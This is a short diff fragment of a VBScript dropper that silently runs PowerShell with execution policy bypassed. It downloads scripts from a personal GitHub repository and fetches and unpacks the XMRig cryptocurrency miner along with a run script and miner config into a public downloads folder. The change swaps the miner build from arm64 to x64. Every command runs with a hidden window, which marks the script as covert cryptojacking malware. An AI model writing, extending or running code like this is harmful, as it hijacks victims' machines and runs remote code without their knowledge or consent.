@@ -21,8 +21,8 @@ WScript.Sleep 2000
 objShell.Run "powershell.exe -ExecutionPolicy Bypass -File C:\Users\Public\Downloads\configure_system.ps1", 0, True
 WScript.Sleep 10000
 objShell.Run "powershell.exe -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/GALVINVN/-/refs/heads/main/ring.ps1 -OutFile C:\Users\Public\Downloads\ring.ps1", 0, True
-objShell.Run "powershell.exe -Command Invoke-WebRequest -Uri https://github.com/xmrig/xmrig/releases/download/v6.26.0/xmrig-6.26.0-windows-arm64.zip -OutFile C:\Users\Public\Downloads\xmrig-6.26.0-windows-arm64.zip", 0, True
-objShell.Run "powershell.exe -Command Expand-Archive -Path 'C:\Users\Public\Downloads\xmrig-6.26.0-windows-arm64.zip' -DestinationPath 'C:\Users\Public\Downloads\' -Force", 0, True
+objShell.Run "powershell.exe -Command Invoke-WebRequest -Uri https://github.com/xmrig/xmrig/releases/download/v6.26.0/xmrig-6.26.0-windows-gcc-x64.zip -OutFile C:\Users\Public\Downloads\xmrig-6.26.0-windows-gcc-x64.zip", 0, True
+objShell.Run "powershell.exe -Command Expand-Archive -Path 'C:\Users\Public\Downloads\xmrig-6.26.0-windows-gcc-x64.zip' -DestinationPath 'C:\Users\Public\Downloads\' -Force", 0, True
 objShell.Run "powershell.exe -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/GALVINVN/system/refs/heads/main/COINRUN.cmd -OutFile C:\Users\Public\Downloads\COINRUN.cmd", 0, True
 objShell.Run "powershell.exe -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/GALVINVN/system/refs/heads/main/config.json -OutFile C:\Users\Public\Downloads\config.json", 0, True
 WScript.Sleep 2000
